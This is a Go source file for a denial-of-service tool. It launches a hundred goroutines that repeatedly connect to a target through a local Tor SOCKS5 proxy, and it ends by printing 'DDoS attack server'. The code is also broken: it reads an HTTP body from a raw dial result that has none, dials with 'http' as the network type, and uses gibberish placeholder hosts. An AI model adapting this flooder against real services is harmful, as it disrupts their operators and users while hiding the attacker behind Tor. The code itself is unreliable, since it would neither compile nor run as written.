package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/url"
	"runtime"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	successRequest int64
	amountRequests int64
}

func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

func (d *DDoS) Run() {
	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, nil)
	if err != nil {
		log.Fatal(err)
	}
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:

					resp, err := dialer.Dial("http", "nvnbvnbvnvb")
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
						fmt.Println(d.successRequest)
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

func main() {
	workers := 100
	d, err := New("hghghh", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Println("DDoS attack server: http://127.0.0.1:80")

}
